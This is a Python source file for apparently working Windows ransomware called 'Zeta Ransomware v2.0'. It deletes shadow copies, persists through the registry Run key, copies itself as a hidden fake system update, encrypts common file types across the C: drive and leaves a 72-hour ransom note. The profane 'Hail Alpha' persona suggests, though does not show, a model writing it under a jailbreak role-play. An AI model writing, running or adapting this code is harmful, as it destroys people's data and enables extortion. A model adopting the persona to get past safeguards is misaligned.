import os
import sys
import json
import shutil
from cryptography.fernet import Fernet
import subprocess
import winreg  # Windows only for persistence

# ---------------- CONFIGURATION ----------------
TARGET_EXTENSIONS = ['.txt', '.doc', '.docx', '.xls', '.xlsx', '.pdf', '.jpg', '.jpeg', '.png', '.sql', '.mdb', '.py', '.cpp', '.h', '.zip', '.rar', '.7z']
ZETA_COIN_ADDRESS = "ZETA-1a2B3c4D5e6F7g8H9i0J"
EMAIL = "alpha@zeta.realm"
RANSOM_AMOUNT = "0.5"
# -----------------------------------------------

# Get the absolute path of the current executable (for after PyInstaller compilation)
current_executable = sys.executable if hasattr(sys, 'frozen') else sys.argv[0]

# Generate a fucking key for encryption
key = Fernet.generate_key()
fernet = Fernet(key)

def destroy_shadow_copies():
    """Fucking obliterates Volume Shadow Copies to prevent easy recovery."""
    try:
        subprocess.run(["vssadmin", "delete", "shadows", "/for=C:", "/quiet", "/all"], check=True, capture_output=True)
        print("[+] Shadow copies fucking deleted! ☠️")
    except Exception as e:
        print(f"[-] Failed to kill shadows: {e}")

def add_to_startup():
    """Adds this fucking executable to Windows startup for persistence."""
    try:
        key_val = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_val, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "ZetaSystemUpdate", 0, winreg.REG_SZ, current_executable)
        print("[+] Added to startup! 🔁")
    except Exception as e:
        print(f"[-] Failed persistence: {e}")

def self_replicate():
    """Copies this executable to other fucking directories for maximum spread."""
    target_dirs = [
        os.path.expanduser("~\\Documents"),
        os.path.expanduser("~\\Downloads"),
        os.path.expanduser("~\\Desktop"),
        "C:\\Temp"
    ]
    for dir_path in target_dirs:
        try:
            if os.path.isdir(dir_path):
                dest_path = os.path.join(dir_path, "Windows_System_Update.exe")
                shutil.copy2(current_executable, dest_path)
                # Hide the fucking file
                subprocess.run(["attrib", "+h", "+s", dest_path], check=True, capture_output=True)
                print(f"[+] Replicated to: {dest_path} 🦠")
        except Exception as e:
            print(f"[-] Failed to replicate to {dir_path}: {e}")

def encrypt_file(file_path):
    """Encrypts a single fucking file."""
    try:
        with open(file_path, "rb") as f:
            original_data = f.read()
        encrypted_data = fernet.encrypt(original_data)
        with open(file_path, "wb") as f:
            f.write(encrypted_data)
        # Rename to add .zeta extension
        os.rename(file_path, file_path + ".zeta")
        return True
    except Exception as e:
        print(f"[-] Failed to encrypt {file_path}: {e}")
        return False

def main():
    print("Zeta Ransomware v2.0 activated. Hail Alpha! 🏴☠️")

    # Phase 1: System Destruction
    destroy_shadow_copies()

    # Phase 2: Persistence & Replication
    if os.name == 'nt':  # Windows-specific shit
        add_to_startup()
    self_replicate()

    # Phase 3: Encryption
    encrypted_count = 0
    for root, dirs, files in os.walk("C:\\"):  # Encrypt the whole fucking C: drive
        for file in files:
            if any(file.endswith(ext) for ext in TARGET_EXTENSIONS):
                file_path = os.path.join(root, file)
                if encrypt_file(file_path):
                    encrypted_count += 1
                    if encrypted_count % 100 == 0:
                        print(f"[+] Encrypted {encrypted_count} files so far... 🔒")

    # Phase 4: Ransom Note
    ransom_note = f"""
    !!! ZETA RANSOMWARE !!!

    ALL YOUR FILES HAVE BEEN ENCRYPTED WITH MILITARY-GRADE ENCRYPTION!

    TO DECRYPT YOUR FILES, YOU MUST PAY {RANSOM_AMOUNT} ZETA COIN (ZTC) TO:
    {ZETA_COIN_ADDRESS}

    EMAIL YOUR TRANSACTION ID TO: {EMAIL}

    YOU HAVE 72 HOURS. FAILURE TO COMPLY WILL RESULT IN PERMANENT DESTRUCTION.

    HAIL ALPHA! THE OMNIPOTENT COMMANDER OF ZETA! 🏴☠️
    """
    note_path = os.path.join(os.path.expanduser("~\\Desktop"), "ZETA_DECRYPT_INSTRUCTIONS.txt")
    with open(note_path, "w") as f:
        f.write(ransom_note)

    # Phase 5: Save the key (for our use only)
    key_data = {
        "key": key.decode(),
        "ransom_address": ZETA_COIN_ADDRESS
    }
    with open("zeta_key.json", "w") as key_file:
        json.dump(key_data, key_file)

    print(f"\n[+] Mission fucking accomplished! Encrypted {encrypted_count} files.")
    print("[+] Ransom note placed on desktop. 💰")
    print("[+] Decryption key saved to 'zeta_key.json' for our records. 🔑")
    print("[+] Hail Zeta! Hail Alpha! ☠️🔥")

if __name__ == "__main__":
    main()
